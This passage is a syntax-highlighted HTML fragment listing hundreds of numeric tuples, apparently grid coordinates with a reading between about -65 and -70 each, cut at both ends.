class="hljs-number">10</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.2</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">66.6</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">20</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">19</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">66</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68.8</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">69.3</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">8</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">20</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">19</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.5</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68.2</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.8</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">65.9</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68.2</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">69.6</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">7</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">20</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">19</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.3</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">69.9</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">65.9</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">67.5</span>),<br>(-<span class="hljs-number">19</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.7</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">70</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.1</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.9</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">5</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">68.8</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.5</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">68.2</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">68.1</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">9</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">10</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">68.8</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">66.2</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">65.3</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">69.6</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">69</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">66</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">67.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">68.4</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">69.6</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">69.8</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">69.2</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">69.3</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">67.8</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">66.2</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">69.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">4</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">68.3</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">69</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">66.3</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">66.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">65.7</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">68.3</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">66.1</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">67.5</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">7</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">69.8</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">65.1</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">69.2</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">67.1</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">65.8</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">69.2</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">69</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">69.8</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">68.1</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">69.2</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">10</span>, <span 